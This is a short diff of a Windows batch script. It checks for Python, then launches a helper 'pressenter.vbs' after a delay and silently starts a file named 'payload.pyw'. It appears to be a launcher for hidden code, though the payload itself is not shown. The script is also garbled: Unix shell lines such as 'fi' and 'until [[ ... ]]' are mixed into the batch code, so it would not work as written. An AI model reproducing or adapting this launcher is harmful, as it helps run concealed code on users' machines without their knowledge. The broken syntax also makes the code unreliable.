@@ -1,9 +1,8 @@
 @echo off
 set "string=python --version"
 set "versionn=Python 3"
-If /I Not "%string%"=="!string:%versionn%=!" (Echo Yes) Else Echo No
 python3
-fi
+if %string:~0,1%==P (echo yes) else (timeout /t 5 /nobreak & start pressenter.vbs)
 until [[ $string != *"Python 3"* ]]
 start payload.pyw
 exit
